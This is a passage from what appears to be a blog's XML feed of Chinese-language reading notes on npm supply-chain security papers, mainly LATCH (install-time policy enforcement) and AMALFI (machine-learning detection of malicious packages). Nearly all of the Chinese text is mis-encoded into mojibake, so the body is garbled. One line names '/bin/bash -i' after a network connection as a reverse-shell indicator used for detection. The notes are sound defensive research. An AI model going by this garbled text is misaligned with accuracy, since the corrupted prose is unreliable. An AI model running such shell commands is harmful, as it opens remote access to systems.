ä¸ªé—®é¢˜ï¼šä¸€æ˜¯ç›¸ä¼¼åº¦è®¡ç®—æ—¶çš„ä¸¤ä¸ªè½¯ä»¶åŒ…ä¹‹é—´å‡½æ•°ASTçš„æ¯”è¾ƒï¼Œè¿™é‡Œå­˜åœ¨æ’åˆ—ç»„åˆçˆ†ç‚¸é—®é¢˜ï¼›äºŒæ˜¯èšç±»æ—¶è¿˜æ˜¯éœ€è¦äººå·¥ä»‹å…¥ï¼Œå¯¹äºæ–°çš„ç±»å‹æ˜¯æ²¡æœ‰åŠæ³•è¯†åˆ«çš„ï¼Œè¿™é‡Œåšçš„å·¥ä½œæ›´åƒæ˜¯ç®€åŒ–å·²æœ‰æµç¨‹ï¼Œå¯¹äºæœªçŸ¥ç±»å‹çš„æ¶æ„è½¯ä»¶åŒ…è¿˜æ˜¯éš¾ä»¥æ£€æµ‹åˆ°ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Paper Reading </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Supply Chain Attack </tag>
            
            <tag> Cluster </tag>
            
            <tag> Package Fingerprint </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PR - Wolf at the Door: Preventing Install-Time Attacks in npm with Latch</title>
      <link href="/2022/06/04/Wolf%20at%20the%20Door%20-%20Preventing%20Install-Time%20Attacks%20in%20npm%20with%20Latch/"/>
      <url>/2022/06/04/Wolf%20at%20the%20Door%20-%20Preventing%20Install-Time%20Attacks%20in%20npm%20with%20Latch/</url>
      
        <content type="html"><![CDATA[<blockquote><p><em>åŸæ–‡ä½œè€…ï¼šElizabeth Wyss, Alexander Wittman, Drew Davidson</em></p><p><em>åŸæ–‡æ ‡é¢˜ï¼šWolf at the Door: Preventing Install-Time Attacks in npm with Latch</em></p><p><em>åŸæ–‡é“¾æ¥ï¼š<a href="https://dl.acm.org/doi/10.1145/3488932.3523262">https://dl.acm.org/doi/10.1145/3488932.3523262</a></em></p><p><em>åŸæ–‡æ¥æºï¼šASIA CCS&#39;22</em></p><p><em>ç¬”è®°ä½œè€…ï¼šoutx</em></p></blockquote><h2 id="0x01-Intro"><a href="#0x01-Intro" class="headerlink" title="0x01 Intro"></a>0x01 Intro</h2><p>NPMçš„åœ°ä½åœ¨ä¹‹å‰è¯»è€…çš„ç¬”è®°ä¸­å·²ç»èŠè¿‡ï¼Œæ­¤å¤„ä¸å†èµ˜è¿°ã€‚åœ¨ä»Šå¤©çš„è¿™ç¯‡è®ºæ–‡ä¸­ï¼Œä½œè€…çš„ä¸»è¦ç ”ç©¶é‡ç‚¹åœ¨äºnpmåŒ…çš„å®‰è£…è¿‡ç¨‹ã€‚åŒæ—¶ä½œè€…æåŠäº†ä¸€ä¸ªå¾ˆæœ‰æ„æ€çš„æ¦‚å¿µâ€”â€”ä¸å—æ¬¢è¿çš„è¡Œä¸ºã€‚è¿™ä¸ªæ¦‚å¿µçš„å…·ä½“å«ä¹‰ä¸ºï¼ŒåŒ…çš„å®‰è£…è„šæœ¬å¯èƒ½æ²¡æœ‰æ˜æ˜¾çš„æ¶æ„æ€§ï¼Œä½†å…¶ä»£ç è§„èŒƒç³Ÿç³•æˆ–æ‰§è¡Œäº†ä¸€äº›ä¸å¿…è¦çš„è¡Œä¸ºã€‚åœ¨å¼€æºåŒ…å®‰å…¨æ€§æ£€æŸ¥ä¸­çš„ç¡®å­˜åœ¨ç€ä¸€äº›è¡Œä¸ºä¸å¥½ç•Œå®šçš„åŒ…ï¼Œä½œè€…æŠŠè¿™äº›åŒ…åœ¨å®‰è£…æ—¶è¡¨ç°å‡ºçš„è¡Œä¸ºç»Ÿç§°ä¸ºä¸è‰¯å®‰è£…æ—¶è¡Œä¸ºã€‚åœ¨è¯»è€…è‡ªå·±çš„ç ”ç©¶ä¸­ä¹Ÿå°è¯•ä½¿ç”¨äº†è¡Œä¸ºæ¶æ„æ€§å’Œç›®çš„æ¶æ„æ€§æ¥è§£é‡Šï¼Œæœ‰æœºä¼šä¼šåœ¨å°†æ¥çš„ç¬”è®°ä¸­è°ˆåŠã€‚</p><p>ä½œè€…åœ¨è°ƒç ”äº†NPMç”Ÿæ€çš„ä¸€äº›åŸºæœ¬æƒ…å†µåï¼Œè®¾è®¡äº†LATCHæ£€æµ‹ç³»ç»Ÿ(<strong>L</strong>ightweight inst<strong>A</strong>ll-<strong>T</strong>ime <strong>CH</strong>ecker)ï¼Œæå‡ºäº†ä¸€äº›å…·æœ‰æŒ‘æˆ˜æ€§çš„ç›®æ ‡ï¼šå¯é…ç½®ã€è‡ªåŠ¨åŒ–ã€é«˜æ€§èƒ½ã€‚</p><p><strong>å¯é…ç½®</strong><br>ç›®å‰å°šæ— ä¸€ä¸ªæ™®éçš„å…±è¯†å…³äºå“ªäº›è¡Œä¸ºåº”å½“è¢«åŒ…çš„å®‰è£…å™¨æ‰€ç¦æ­¢ã€‚è¿™ä¸»è¦åœ¨äºåŒ…ç”Ÿæ€ç³»ç»Ÿä¸­çš„ä¸åŒè§’è‰²å¯¹äºè¡Œä¸ºçš„å®šä¹‰ä¸åŒã€‚æ¶æ„è¡Œä¸ºçš„è¾¹ç•Œå®šä¹‰ä¸æ¸…ï¼Œå¯¹å¯æ¥å—çš„åŒ…è¡Œä¸ºç•Œå®šç¼ºä¹å…±è¯†ï¼Œç›´æ¥æˆ–é—´æ¥åœ°å½±å“åˆ°äº†æ•´ä¸ªç”Ÿæ€çš„å®‰å…¨æ€§ã€‚ä½œè€…é€šè¿‡å¼•å…¥ä¸€ç§æ–°çš„è¯­è¨€ç­–ç•¥ï¼Œè®©LATCHçš„ç”¨æˆ·èƒ½å¤Ÿè¡¨è¾¾å‡ºä»–ä»¬èƒ½æ¥å—çš„åŒ…è¡Œä¸ºä»¥è§£å†³è¿™ä¸€é—®é¢˜ã€‚ï¼ˆè¿™é‡Œä½œè€…çš„ç²¾å¿ƒæ„é€ å¾ˆå€¼å¾—å­¦ä¹ ï¼Œè®©ç”Ÿæ€ä¸­çš„å‚ä¸è€…æ¸…æ™°è¡¨è¾¾å’ŒåŠ¨æ€è°ƒæ•´å…¶èƒ½æ¥å—çš„åŒ…åœ¨å®‰è£…è¿‡ç¨‹ä¸­çš„è¡Œä¸ºä¸å¤±ä¸ºä¸€ç§å¦™è®¡ï¼</p><p><strong>è‡ªåŠ¨åŒ–</strong><br>åŒ…ç®¡ç†ç³»ç»Ÿæœ€å¤§çš„å¥½å¤„åœ¨äºå°†åŒ…çš„ä¸‹è½½ã€å®‰è£…å’Œé…ç½®ç­‰è¿‡ç¨‹å®Œå…¨è‡ªåŠ¨åŒ–å¤„ç†äº†ï¼Œä½†ä¹Ÿæ­£æ˜¯è¿™ç§è‡ªåŠ¨åŒ–æ–¹ä¾¿äº†æ”»å‡»è€…å®æ–½ä¾›åº”é“¾æ”»å‡»ã€‚ä½œè€…å¼•å…¥äº†è¡Œä¸ºæ¸…å•è¿™ä¸€æ¦‚å¿µï¼šæè¿°åŒ…åœ¨å®‰è£…è¿‡ç¨‹ä¸­ä¸å®‰å…¨ç›¸å…³çš„è¡Œä¸ºã€‚è¿™ä»½è¡Œä¸ºæ¸…å•æ˜¯LATCHåœ¨æ²™ç›’ç¯å¢ƒä¸­æ‰§è¡Œå’Œè·Ÿè¸ªåŒ…çš„å®‰è£…è¿‡ç¨‹ä¸­è‡ªåŠ¨ç”Ÿæˆçš„ã€‚å½“ç”¨æˆ·å°è¯•å®‰è£…åŒ…çš„æ—¶å€™ï¼ŒLATCHä»ä¸¤æ–¹é¢è¿›è¡Œé˜²æŠ¤ï¼šä¸€æ˜¯æ ¹æ®é¢„è®¾ç­–ç•¥æ£€æŸ¥è¡Œä¸ºæ¸…å•ï¼Œå½“è§¦å‘ç›¸åº”çš„è¡Œä¸ºæ—¶ç»ˆæ­¢å®‰è£…ï¼›äºŒæ˜¯åœ¨å®‰è£…æœŸé—´ï¼Œé€šè¿‡å†…æ ¸çº§çš„å®‰å…¨æ¨¡å—åœ¨é˜²æ­¢ç”¨æˆ·ç­–ç•¥åç¦»çš„æƒ…å†µä¸‹å®ŒæˆåŒ…çš„å®‰è£…ã€‚</p><p><strong>é«˜æ€§èƒ½</strong><br>å¤§å‹ã€é«˜åº¦ç›¸äº’ä¾èµ–çš„åŒ…åœ¨å®‰è£…æ—¶å¯èƒ½ä¼šåŒæ—¶å®‰è£…æ•°ç™¾ä¸ªåŒ…ã€‚ä½œè€…é€šè¿‡ç¼“å­˜æœºåˆ¶ï¼ˆå¼‚æ­¥ç”Ÿæˆæ¸…å•ï¼Œå®æ—¶æ£€æŸ¥æ¸…å•ï¼‰å°½å¯èƒ½åœ°ç¼©å°å¼€é”€ä»¥è§£å†³æ€§èƒ½æŒ‘æˆ˜ã€‚</p><h2 id="0x02-LATCH"><a href="#0x02-LATCH" class="headerlink" title="0x02 LATCH"></a>0x02 LATCH</h2><p>LATCHçš„å·¥ä½œæµç¨‹åŒ…æ‹¬äº†ä¸‰ä¸ªé˜¶æ®µï¼šè¡Œä¸ºæ¸…å•ç”Ÿæˆã€ç”¨æˆ·ç­–ç•¥æ£€æŸ¥ã€å®æ—¶å®‰å…¨å®‰è£…</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/0e366414-5dfe-415b-a2ae-7f9a80c0e134.png"></p><p><strong>è¡Œä¸ºæ¸…å•ç”Ÿæˆ</strong><br><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/30392e41-a80f-40e3-9863-9baa6b219064.png"></p><p>ä½œè€…ä½¿ç”¨<a href="https://github.com/apptainer/singularity">Singularity</a>å’Œ<a href="https://github.com/strace/strace">strace</a>æ„é€ åŠ¨æ€è¿è¡Œç¯å¢ƒã€‚é€šè¿‡è¿™ç§æ–¹æ³•ï¼Œå¯ä»¥è§‚å¯ŸåŒ…åœ¨å®‰è£…è¿‡ç¨‹ä¸­çš„å…·ä½“è¡Œä¸ºã€‚ä½œè€…å°†è¿™äº›è¡Œä¸ºè®°å½•åˆ°æ—¥å¿—æ–‡ä»¶ä¸­ï¼Œç„¶åæ ¹æ®æ—¥å¿—æ–‡ä»¶ç”ŸæˆåŒ…çš„è¡Œä¸ºæ¸…å•ï¼Œå¹¶å­˜å‚¨åˆ°æ¸…å•æ•°æ®åº“ä¸­ã€‚</p><p><strong>ç”¨æˆ·ç­–ç•¥æ£€æŸ¥</strong><br>å½“ç”¨æˆ·å°è¯•å®‰è£…åŒ…æ—¶ï¼ŒLATCHä¼šæ ¹æ®ç”¨æˆ·ç­–ç•¥æ¥æ£€æŸ¥è¿™äº›åŒ…åŠå…¶ä¾èµ–é¡¹çš„è¡Œä¸ºæ¸…å•ï¼Œä»¥é˜»æ­¢é‚£äº›ç”¨æˆ·ä¸å¸Œæœ›å‘ç”Ÿçš„è¡Œä¸ºã€‚è¿™é‡Œä½œè€…å—SELinuxç­‰ç³»ç»Ÿå¯å‘ï¼Œè®¾å®šäº†ä¸¤ç§å·¥ä½œæ¨¡å¼ï¼šwarningå’Œfailureã€‚åœ¨warningæ¨¡å¼ä¸‹ï¼Œè¿åç”¨æˆ·ç­–ç•¥åªä¼šäº§ç”Ÿè­¦å‘Šè€Œä¸ä¼šç»ˆæ­¢å®‰è£…ç¨‹åºï¼›åœ¨failureæ¨¡å¼ä¸‹ï¼Œè¿åä»»ä½•ä¸€æ¡ç­–ç•¥ä¼šç›´æ¥å¯¼è‡´å®‰è£…å¤±è´¥ã€‚</p><p><strong>å®æ—¶å®‰å…¨å®‰è£…</strong><br>å•æ¬¡è¿è¡Œè·å¾—çš„è¡Œä¸ºæ¸…å•æœ‰æ—¶å€™æ— æ³•å®Œå…¨æ•è·é‚£äº›ç”±äºç³»ç»Ÿæ¶æ„å·®å¼‚æˆ–æ˜¯é€»è¾‘ç»•è¿‡ç­‰å¯¹æŠ—æ€§è§„é¿æ£€æµ‹æŠ€æœ¯æ„é€ çš„åŒ…çš„å®‰è£…è¡Œä¸ºã€‚ä¸ºäº†åœ¨çœŸå®ç¯å¢ƒä¸‹å¤„ç†å’Œåº”å¯¹è¿™ä¸€æƒ…å†µï¼Œä½œè€…åˆ©ç”¨å†…æ ¸çº§å®‰å…¨æ¨¡å—ï¼ˆ<a href="https://gitlab.com/apparmor/apparmor">AppArmor</a>ï¼‰æ¥ä¿è¯åŒ…å®‰è£…è¿‡ç¨‹çš„å®‰å…¨æ€§ã€‚</p><h2 id="0x03-Manifest-Enforcement-Policies"><a href="#0x03-Manifest-Enforcement-Policies" class="headerlink" title="0x03 Manifest Enforcement Policies"></a>0x03 Manifest Enforcement Policies</h2><p>ä½œè€…è®¾è®¡äº†ä¸€ç§è½»é‡çº§çš„ç­–ç•¥è¯­è¨€ï¼Œå…è®¸ç”¨æˆ·é€šè¿‡è¿™ç§æ–¹å¼æ¥è¡¨è¾¾åœ¨åŒ…çš„å®‰è£…è¿‡ç¨‹ä¸­å…è®¸å‘ç”Ÿçš„è¡Œä¸ºã€‚è¯¥è¯­è¨€ä»¥æ¸…å•å±æ€§ä¸ºä¸­å¿ƒï¼Œä½¿ç”¨è¯­æ³•è¡¨è¾¾å¼è§£ææ¥å®ç°ã€‚<br><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/4232c3af-6b6f-41e4-b6fe-73330f6fa227.png"></p><p>åœ¨è®ºæ–‡ä¸­ï¼Œä½œè€…ç»™åŒ…ç®¡ç†ç”Ÿæ€ç³»ç»Ÿä¸­ä¸¤å¤§ä¸»è¦è§’è‰²æä¾›äº†é»˜è®¤ç­–ç•¥å»ºè®®ã€‚</p><p><strong>å¼€å‘è€…ç­–ç•¥</strong><br>è¯¥ç­–ç•¥æ—¨åœ¨æ»¡è¶³æœ‰å®‰å…¨æ„è¯†çš„å¼€å‘äººå‘˜çš„éœ€æ±‚ï¼Œä»–ä»¬å¸Œæœ›é˜»æ­¢ç³»ç»Ÿä¸Šæ‰€æœ‰å®‰å…¨æ•æ„Ÿçš„è¡Œä¸ºã€‚è¿™ç§ç­–ç•¥å¯ä»¥ç¡®ä¿åœ¨å®‰è£…è¿‡ç¨‹ä¸­ä¸ä¼šå‡ºç°å±é™©è¡Œä¸ºï¼Œä½†ä¼šå½±å“ä¸€äº›åŒ…çš„æ­£å¸¸å®‰è£…ã€‚å…·ä½“æ¥è¯´ï¼Œè¯¥ç­–ç•¥å…è®¸å®‰è£…è„šæœ¬å°†è¾“å‡ºæ‰“å°åˆ°ç»ˆç«¯ä¸Šï¼Œå…è®¸è¯»å–éæ•æ„Ÿæ–‡ä»¶ï¼Œä½†é˜»æ­¢ç½‘ç»œè¿æ¥è¡Œä¸ºå’Œæ–‡ä»¶å†™å…¥è¡Œä¸ºã€‚å®Œæ•´çš„ç­–ç•¥å¦‚ä¸‹ã€‚</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/c7dcafbd-485e-41e8-a7b3-a62813d024e4.png"></p><p><strong>ç»´æŠ¤è€…ç­–ç•¥</strong><br>è¯¥ç­–ç•¥æ—¨åœ¨æ»¡è¶³npmä»“åº“ç»´æŠ¤äººå‘˜çš„éœ€æ±‚ï¼Œå°½å¯èƒ½åªç­›é™¤å­˜åœ¨æ˜æ˜¾æ¶æ„è¡Œä¸ºçš„åŒ…ã€‚ä½œè€…éšæœºæŠ½æ ·äº†375ä¸ªæ€»æ‰€å‘¨çŸ¥æ˜¯æ­£å¸¸çš„npmåŒ…å’Œ375ä¸ªè¢«ç»´æŠ¤è€…åˆ é™¤çš„æ¶æ„åŒ…ï¼ˆä½œè€…æ­¤å¤„æ²¡æœ‰è¯´æ˜æ˜¯å¦‚ä½•ä»102åˆ°375çš„ï¼Œè¯»è€…æ¨æµ‹æ˜¯ä»102ä¸ªæ¶æ„åŒ…çš„ä¸åŒç‰ˆæœ¬ä¸­è·å¾—çš„ï¼‰ï¼Œå¹¶æ„å»ºäº†ä¸€ä¸ªCARTå†³ç­–æ ‘åˆ†ç±»å™¨æ¥åŒºåˆ†æ­£å¸¸åŒ…å’Œæ¶æ„åŒ…ï¼Œç„¶åç›´æ¥ç”±è¯¥å†³ç­–æ ‘åˆ†æ”¯ç”Ÿæˆç­–ç•¥è§„åˆ™ã€‚</p><p>ä¸€å¥è¯æ¦‚æ‹¬ä¸Šè¿°åŸºæœ¬ç­–ç•¥ï¼šå¼€å‘è€…ç­–ç•¥æ˜¯æœ€èƒ½å¤Ÿé˜»æ­¢æ¶æ„è¡Œä¸ºçš„ç­–ç•¥ï¼Œä½†ä¼šå¯¼è‡´ä¸€äº›åŒ…çš„å®‰è£…å¤±è´¥ï¼›ç»´æŠ¤è€…ç­–ç•¥å…è®¸å®‰è£…æ›´å¤šçš„åŒ…ï¼ŒåŒæ—¶ä¹Ÿèƒ½æŠ¥å‘Šå‡ ä¹æ‰€æœ‰å·²çŸ¥çš„æ¶æ„åŒ…ï¼Œä½†ä¹Ÿè®¸ä¼šå­˜åœ¨é—æ¼ã€‚ï¼ˆæ­¤å¤„æ˜¯è¯»è€…çš„ç†è§£</p><h2 id="0x04-Conclusion"><a href="#0x04-Conclusion" class="headerlink" title="0x04 Conclusion"></a>0x04 Conclusion</h2><p>ä½œè€…é‡‡ç”¨äº†ä¸€ç§æ–°çš„æƒé™ç³»ç»Ÿæ¥é™åˆ¶npmåŒ…çš„å®‰è£…æ—¶è¡Œä¸ºå¹¶ç”Ÿæˆè¡Œä¸ºæ¸…å•ï¼ŒåŒæ—¶æå‡ºäº†ä¸€ç§è½»é‡çº§ç­–ç•¥è¯­è¨€æ¥æ£€æŸ¥è¡Œä¸ºæ¸…å•ï¼Œä»¥å‘ç°æ¶æ„åŒ…å’Œé˜»æ­¢æ¶æ„è¡Œä¸ºã€‚</p><p>è¯»è€…åœ¨ç ”è¯»è¿‡ç¨‹ä¸­æ³¨æ„åˆ°ä½œè€…æåˆ°äº†ä¸€ä¸ªå¯¹æŠ—æ€§è§„é¿æ£€æµ‹ã€‚LATCHèƒ½å¤Ÿæä¾›ä¸€äº›é˜²æŠ¤ï¼Œä½†æ˜¯åœ¨ä¸Šè¿°çš„è¡Œä¸ºæ¸…å•ç”Ÿæˆè¿‡ç¨‹ä¸­ï¼Œä½œè€…æœ‰æ„è¿›è¡Œè¡Œä¸ºæ„å›¾æ¨æ–­ï¼Œæ¯”å¦‚å‰ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ä¸ºç½‘ç»œè¿æ¥ï¼Œä¸‹ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ä¸ºè¿›ç¨‹åˆ›å»ºï¼Œä¸”æ¶‰åŠå‚æ•°ä¸º<code>/bin/bash -i</code>ï¼Œè¿™é‡Œä½œè€…åˆç†æ¨æ–­è¯¥è¡Œä¸ºæ˜¯åå¼¹shellï¼Œæ˜¯ä¸€ä¸ªæ¶æ„è¡Œä¸ºã€‚ä½†å¦‚æœæ”»å‡»è€…å°†æ¶æ„è¡Œä¸ºæ‹†è§£ï¼Œåœ¨ä¸­é—´æ’å…¥ä¸€äº›æ— å…³ç´§è¦çš„éæ•æ„Ÿæ–‡ä»¶è¯»å–ç­‰è¡Œä¸ºï¼Œæ‰“ä¹±æ¶æ„è¡Œä¸ºçš„æ˜æ˜¾ç‰¹å¾åè¯¥æ–¹æ³•æ˜¯å¦è¿˜èƒ½å¤Ÿåˆç†æ¨æ–­æ˜¯éœ€è¦è¿›ä¸€æ­¥ç ”ç©¶çš„ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Paper Reading </category>
          
      </categories>
      
      
        <tags>
            
            <tag> NPM </tag>
            
            <tag> Supply Chain Attack </tag>
            
            <tag> ASIA CCS&#39;22 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PR - Practical Automated Detection of Malicious npm Packages</title>
      <link href="/2022/05/26/Practical%20Automated%20Detection%20of%20Malicious%20npm%20Packages/"/>
      <url>/2022/05/26/Practical%20Automated%20Detection%20of%20Malicious%20npm%20Packages/</url>
      
        <content type="html"><![CDATA[<blockquote><p><em>åŸæ–‡ä½œè€…ï¼šAdriana Sejfia, Max SchÃ¤fer</em></p><p><em>åŸæ–‡æ ‡é¢˜ï¼šPractical Automated Detection of Malicious npm Packages</em></p><p><em>åŸæ–‡é“¾æ¥ï¼š<a href="https://arxiv.org/pdf/2202.13953.pdf">https://arxiv.org/pdf/2202.13953.pdf</a></em></p><p><em>åŸæ–‡æ¥æºï¼šICSE&#39;22</em></p><p><em>ç¬”è®°ä½œè€…ï¼šoutx</em></p></blockquote><h2 id="0x01-Intro"><a href="#0x01-Intro" class="headerlink" title="0x01 Intro"></a>0x01 Intro</h2><p>Javascriptæµè¡Œå·²ä¹…ï¼ŒV8å¼•æ“æ›´æ˜¯è®©å…¶è¿›åŒ–ä¸ºæœåŠ¡ç«¯å¼€å‘è¯­è¨€çš„ä¸€å‘˜ã€‚å…¶å¯¹åº”çš„åŒ…ç®¡ç†å·¥å…·NPMä¸­å­˜åœ¨ç€å¤§é‡çš„å¯é‡ç”¨è½¯ä»¶åŒ…ï¼Œä½“é‡å·¨å¤§ã€‚ç¤¾åŒºçš„çƒ­åº¦ä¿ƒè¿›äº†NPMçš„å‘å±•ï¼Œä¹Ÿä¿ƒè¿›äº†Node.jsçš„å‘å±•ã€‚ä½†åœ¨NPMä¸­å‘å¸ƒä¸€ä¸ªæ–°çš„åŒ…åªéœ€è¦æ³¨å†Œä¸€ä¸ªNPMè´¦æˆ·å³å¯ï¼Œæ›´æ–°ä¸€ä¸ªåŒ…çš„æ–°ç‰ˆæœ¬ä¹Ÿåªéœ€è¦ç®€å•åœ°è¿›è¡Œæ³¨å†Œè¡¨ä¸Šä¼ åŒæ­¥ã€‚æ¶æ„åŒ…åœ¨è¿‘å‡ å¹´æˆä¸ºä¸€å¤§ç„¦ç‚¹é—®é¢˜ï¼Œå› ä¸ºå“ªæ€•å®˜æ–¹å¾ˆå¿«åœ°å‘ç°å¹¶æ¸…é™¤äº†è¿™äº›æ¶æ„åŒ…ï¼Œåœ¨æ³¨å†Œè¡¨ä¸­å­˜æ´»å¾ˆçŸ­ä¸€æ®µæ—¶é—´æœ€ç»ˆä¹Ÿä¼šå½±å“åˆ°ä¸€å¤§ç‰‡ç»ˆç«¯ç”¨æˆ·ã€‚</p><p>è¦ä»æ ¹æœ¬ä¸Šè§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæ— éæ˜¯ä»ä¸¤ä¸ªæ–¹é¢ï¼šä¸€æ˜¯é˜»æ–­è¿™äº›æ¶æ„åŒ…è¢«åŒæ­¥åˆ°æ³¨å†Œè¡¨ä¸­ï¼Œå³ä¸¥æ ¼æ‰§è¡Œå®¡æŸ¥æœºåˆ¶ï¼Œåœ¨è¿™äº›æ¶æ„åŒ…ä»ä¸Šä¼ å¼€å§‹åˆ°å®é™…è¢«åŒæ­¥åˆ°æ³¨å†Œè¡¨ä¸­çš„è¿™æ®µæ—¶é—´é‡Œè¿›è¡Œæ£€æŸ¥å¹¶æ¸…ç†ï¼›äºŒæ˜¯æ‰§è¡Œè®¿é—®æ§åˆ¶æ¥é™åˆ¶åŒ…çš„å®‰è£…è¿‡ç¨‹ï¼Œç¼©å°æ”»å‡»é¢ã€‚ä½œè€…åˆ™æ˜¯è€ƒè™‘åœ¨ä¸æ”¹å˜ç°æœ‰çš„NPMåŸºæœ¬è¿‡ç¨‹çš„æƒ…å†µä¸‹ï¼Œå°½å¯èƒ½å¿«åœ°æ£€æµ‹å‡ºæ¶æ„åŒ…ï¼Œç„¶åæ¸…ç†ã€‚ï¼ˆé¢˜å¤–è¯ï¼Œè¯»è€…è®¤ä¸ºå¦‚æ­¤é‡è¦çš„ä¸€å¤§ç¤¾åŒºç”Ÿæ€ï¼Œä¸ºäº†æé«˜æ•´ä½“å®‰å…¨æ€§åšå‡ºä¸€äº›æ”¹å˜æ˜¯å€¼å¾—å¥½å¥½è€ƒè™‘çš„ã€‚</p><p>ä½œè€…ä¸ºäº†éªŒè¯å…¶æ–¹æ³•åœ¨å®é™…æƒ…å†µä¸‹çš„æœ‰æ•ˆæ€§ï¼Œæå‡ºäº†ä¸‰ä¸ªå‡†åˆ™ï¼š</p><ul><li>è‡ªåŠ¨åŒ–ï¼Œä¸ä½¿ç”¨äººå·¥å®¡æŸ¥</li><li>å®æ—¶æ€§ï¼Œéœ€è¦è·Ÿä¸Šç‰ˆæœ¬æ›´è¿­é€Ÿåº¦</li><li>å‡†ç¡®ç‡ï¼Œé¿å…é”™è¯¯æ ‡è®°æ­£å¸¸åŒ…æˆ–æ˜¯é—æ¼æ¶æ„åŒ…</li></ul><h2 id="0x02-Method"><a href="#0x02-Method" class="headerlink" title="0x02 Method"></a>0x02 Method</h2><p>ä½œè€…æå‡ºäº†AMALFIæ¥æ»¡è¶³ä¸Šè¿°æœ‰æ•ˆæ€§å‡†åˆ™ï¼š</p><ul><li>ç”¨æ ‡è®°æ•°æ®è¿›è¡Œæœºå™¨å­¦ä¹ åˆ†ç±»å™¨çš„è®­ç»ƒï¼ŒåŒ…æ‹¬APIsç‰¹å¾å’Œç”¨è½»é‡è¯­ä¹‰æ‰«æè·å¾—çš„å…ƒæ•°æ®</li><li>ä½¿ç”¨æºä»£ç è¿›è¡ŒåŒ…çš„é‡æ„ï¼Œå¹¶ä¸å…¶åœ¨æ³¨å†Œè¡¨ä¸­å‘å¸ƒçš„ç‰ˆæœ¬è¿›è¡Œæ¯”è¾ƒ</li><li>ç›¸ä¼¼åº¦æ£€æµ‹å™¨ï¼Œç”¨äºå¯¹å·²çŸ¥æ¶æ„åŒ…çš„æ£€æŸ¥</li></ul><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/74b74a2b-b5d6-405b-a8bb-d8f5c1071dd8.png"></p><h3 id="0x021-Feature-set"><a href="#0x021-Feature-set" class="headerlink" title="0x021 Feature set"></a>0x021 Feature set</h3><p>å•åŒ…ç‰¹å¾åŒ…æ‹¬ï¼š  </p><ol><li><p>è·å–ç»ˆç«¯ç”¨æˆ·ä¸ªäººæ•æ„Ÿä¿¡æ¯ï¼šè´¦æˆ·ã€å¯†ç ç­‰</p></li><li><p>è®¿é—®ç‰¹å®šçš„ä¸€äº›ç³»ç»Ÿèµ„æº  </p><ol><li>æ–‡ä»¶æ“ä½œï¼šè¯»å–/å†™å…¥  </li><li>è¿›ç¨‹åˆ›å»ºï¼šåˆ›å»ºæ–°è¿›ç¨‹  </li><li>ç½‘ç»œè¯·æ±‚ï¼šæ”¶å‘æ•°æ®</li></ol></li><li><p>ä½¿ç”¨ç‰¹å®šçš„ä¸€äº›APIs  </p><ol><li>åŠ å¯†åŠŸèƒ½  </li><li>æ•°æ®ç¼–ç   </li><li>åŠ¨æ€ä»£ç ç”Ÿæˆ</li></ol></li><li><p>å®‰è£…æ—¶è¿è¡Œè„šæœ¬</p></li><li><p>çŸ­ä»£ç ï¼ˆé¿å…æ£€æµ‹ï¼‰æˆ–äºŒè¿›åˆ¶æ–‡ä»¶ï¼ˆå¯æ‰§è¡Œæ–‡ä»¶ï¼‰</p></li></ol><p>å¤šç‰ˆæœ¬ç‰¹å¾åŒ…æ‹¬ï¼š</p><ol><li>ç‰ˆæœ¬å‘å¸ƒçš„é—´éš”æ—¶é—´</li><li>ç‰ˆæœ¬æ›´æ–°è¯´æ˜ä¸­æè¿°çš„æ›´æ–°ç±»å‹</li></ol><p>éœ€è¦è¯´æ˜çš„æ˜¯ï¼Œå¯¹äºç¬¬ä¸€æ¬¡ä¸Šä¼ åˆ°æ³¨å†Œè¡¨ä¸­çš„åŒ…ï¼Œä½œè€…å¼•å…¥äº†ä¸€ä¸ªä¼ªæ›´æ–°ç‰ˆæœ¬ï¼Œè®¾å®šç‰ˆæœ¬å‘å¸ƒä¹‹é—´çš„æ—¶é—´ä¸º0ï¼Œæ›´æ–°ç±»å‹åˆ™æ˜¯å•åŒ…ç‰¹å¾ä¸­çš„æè¿°ã€‚ï¼ˆé¢˜å¤–è¯ï¼Œä½œè€…å¹¶æ²¡æœ‰è§£é‡Šä¸ºä½•è®¾å®šä¸º0ï¼Œè¯»è€…å­˜ç–‘ï¼šéš¾é“ä¸å­˜åœ¨ä¸€ä¸ªå¹´ä¹…å¤±ä¿®çš„åŒ…çªç„¶è¢«æ”»å‡»è€…æ¥ç®¡çš„å¯èƒ½æ€§ä¹ˆï¼Ÿ</p><h3 id="0x022-Feature-extraction"><a href="#0x022-Feature-extraction" class="headerlink" title="0x022 Feature extraction"></a>0x022 Feature extraction</h3><p>ä½œè€…ä½¿ç”¨Tree-sitteræ¥è§£æåŒ…ä¸­çš„Javascriptå’ŒTypescriptæ–‡ä»¶ä»¥è·å–å•åŒ…ç‰¹å¾ï¼šå¯¹äºç‰¹å¾1ï¼Œå­—ç¬¦ä¸²åŒ¹é…ï¼›å¯¹äºç‰¹å¾2å’Œç‰¹å¾3ï¼ŒAPIåŒ¹é…ï¼›å¯¹äºç‰¹å¾4ï¼Œè°ƒç”¨evalå’ŒFunctionæ¥ç”Ÿæˆä»£ç ï¼›å¯¹äºç‰¹å¾5ï¼Œè€ƒè™‘Shannonç†µå€¼ã€‚å¯¹äºå¤šç‰ˆæœ¬ç‰¹å¾åˆ™æ˜¯åˆ©ç”¨npm view timeè·å–ç‰ˆæœ¬å‘å¸ƒæ—¶é—´é—´éš”ï¼›åˆ©ç”¨è¯­ä¹‰åˆ†æè·å–æ›´æ–°ç±»å‹ã€‚ï¼ˆä½œè€…æœªåœ¨æ–‡ä¸­ç»™å‡ºç›¸å…³å¯å‘å¼è§„åˆ™ï¼Œæ„Ÿå…´è¶£å¯ä»¥è¿›ä¸€æ­¥å»ä»£ç ä¸­çœ‹</p><h3 id="0x023-Classifier-trainning"><a 